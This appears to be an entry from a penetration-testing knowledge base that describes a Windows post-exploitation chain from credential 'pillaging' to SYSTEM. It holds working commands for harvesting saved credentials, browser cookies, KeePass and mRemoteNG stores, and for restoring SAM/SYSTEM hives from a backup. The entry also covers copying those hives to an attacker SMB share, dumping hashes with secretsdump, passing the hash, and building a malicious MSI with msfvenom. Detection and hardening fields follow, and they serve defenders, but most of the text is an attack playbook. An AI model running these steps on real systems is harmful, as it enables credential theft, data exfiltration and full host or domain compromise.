notes:
=== Attack Chain: Pillaging → Credential Chain → SYSTEM ===
Systematic post-exploitation sweep converting information access into privilege escalation.

=== CHAIN OVERVIEW ===
Initial low-priv foothold → Enumerate installed software → Find credential store → Decrypt/crack → Escalate

=== PILLAGING PRIORITY ORDER ===
1. cmdkey /list → immediate impersonation if saved creds exist (runas /savecred)
2. reg query Winlogon → Autologon plaintext password
3. (Get-PSReadLineOption).HistorySavePath | cat → PowerShell command history
4. findstr credential sweep → config files, unattend.xml, web.config
5. .\lazagne.exe all → broadest credential sweep
6. .\SharpChrome.exe logins → browser saved passwords
7. Get-ChildItem -Recurse *.kdbx → KeePass databases
8. stickynotes query → plum.sqlite contents
9. Get-LocalUser | Select Description → description field passwords
10. mRemoteNG confCons.xml → remote access tool credentials

=== INSTALLED SOFTWARE ENUMERATION (START HERE) ===
  wmic product get name   → MSI-packaged software
  dir "C:\Program Files"  → quick visual sweep
  dir "C:\Program Files (x86)"
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion

HIGH-VALUE APPLICATIONS TO FIND:
  mRemoteNG → confCons.xml with all server credentials
  KeePass → .kdbx database with all org credentials
  Druva inSync 6.6.3 → RPC command injection → SYSTEM
  Any backup agent → admin access to all backed-up systems
  Password managers (RoboForm, 1Password, Bitwarden desktop) → credential vault
  Database clients (SQL Management Studio) → saved connection credentials

=== CHAINING CONTEXT ===
Pillaging → KeePass master password → all org credentials → domain compromise
Pillaging → mRemoteNG confCons.xml → RDP credentials for DC → domain admin access
Pillaging → confCons.xml → SQL server credentials → xp_cmdshell → SYSTEM on SQL
Pillaging → browser cookies → Slack session → internal comms reveal network architecture
Pillaging → PS history → service account passwords → lateral movement

=== ATTACKER MINDSET ===
Pillaging is not optional — run at EVERY privilege level on EVERY new system.
The same application installed by different users has different credential stores.
Each new account compromise = restart the pillaging cycle for that user's context.
Backup systems are single points aggregating access to all backed-up systems — always prioritize.
name: Attack Chain - Pillaging to SYSTEM
command: # mRemoteNG creds -> Slack cookie -> restic backup -> SAM/SYSTEM -> pass-the-hash
description: The full Pillaging kill chain: harvest stored creds, pivot through users, restore backup hives, extract the Administrator hash, and pass-the-hash to SYSTEM.

steps.label: 2. Steal Firefox/Slack cookie
steps.command:
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d

steps.label: 4. Restore hives from backup
steps.command:
$env:RESTIC_PASSWORD='Superbackup!'
restic.exe -r E:\restic snapshots
restic.exe -r E:\restic restore <id> --target C:\Restore

steps.label: 5. Exfil SAM/SYSTEM/SECURITY via SMB
steps.command:
# Kali: sudo impacket-smbserver share . -smb2support -username kali -password kali
net use Z: \\<lhost>\share /user:kali kali
copy "C:\Restore\C\Windows\System32\config\SAM" Z:\

steps.label: 6. Extract hash + pass-the-hash
steps.command:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
impacket-psexec Administrator@<ip> -hashes :<ntlm_hash>

defense.why_it_works: Pillaging chains stored secrets: one recovered credential unlocks the next. mRemoteNG's hardcoded default encryption key decrypts saved connection passwords; browser/chat cookies and config files leak further creds; a restic backup password ultimately exposes the SAM/SYSTEM/SECURITY hives, whose local hashes enable pass-the-hash to SYSTEM. No exploit is used — only secrets left on disk.
defense.prerequisites: An initial foothold on the host with read access to stored configs and backups, and either SYSTEM access to read the live SAM or a backup/shadow copy containing the SAM, SYSTEM, and SECURITY registry hives.
defense.impact: The local Administrator NTLM hash, replayed via pass-the-hash for SYSTEM/local-admin execution — and often the pivot creds to reach the next host in the chain.
defense.detection: [MITRE T1003.002 AN0235] An adversary with SYSTEM privileges executes commands or accesses registry keys to dump the SAM hive, or reads sensitive local files from the config directory — often sequential access to HKLM\SAM and HKLM\SYSTEM and the creation of .save/.dmp files for offline hash extraction. Also watch for `reg save hklm\sam`, secretsdump execution, and pass-the-hash logons (Event 4624 Logon Type 3 / 4776 with NTLM from an unusual source).
defense.artifacts: Copied SAM/SYSTEM/SECURITY hive files (.save); impacket-secretsdump execution; access to mRemoteNG confCons.xml and browser cookie stores; SMB transfer of the hive files to an attacker share; a pass-the-hash logon using the local admin hash.
defense.prevention: [MITRE T1003.002 M1027 Password Policies] give every host a unique, complex local-admin password (LAPS) so one recovered local hash unlocks nothing else; [M1026 Privileged Account Management] never reuse domain-admin creds locally; [M1028 OS Configuration] restrict/disable NTLM; encrypt backups and never store backup passwords in cleartext; avoid saving passwords in tools like mRemoteNG.
defense.evasion: Restoring the hives from a backup avoids touching the live HKLM\SAM (sidestepping SAM-access detection); relying only on stored secrets needs no exploit and blends with normal administrative activity.
defense.misconfiguration: Windows systems accumulate privilege escalation paths over time: scheduled tasks running as SYSTEM with world-writable scripts, service binaries with weak DACL (non-admins can overwrite), AlwaysInstallElevated enabled (any MSI installs as SYSTEM), or SeImpersonatePrivilege granted to web/service accounts.
defense.vulnerable_config:
# AlwaysInstallElevated (any user installs MSI as SYSTEM):
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 1  ->  msfvenom -p windows/exec CMD=calc.exe -f msi > priv.msi; msiexec /quiet /i priv.msi

# Service binary with weak DACL:
icacls C:\Program Files\VulnSvc\svc.exe
# BUILTIN\Users:(F)  <-- any user has Full Control -> replace with malicious binary
defense.secure_config:
# Disable AlwaysInstallElevated:
# GPO: Computer Config > Admin Templates > Windows Components > Windows Installer
#   'Always install with elevated privileges' = Disabled
# Registry (both keys required):
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -Value 0
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -Value 0

# Fix service binary DACLs:
icacls 'C:\Program Files\VulnSvc\svc.exe' /inheritance:r /grant:r 'NT AUTHORITY\SYSTEM:(F)' 'BUILTIN\Administrators:(F)'
# Remove all non-admin write permissions
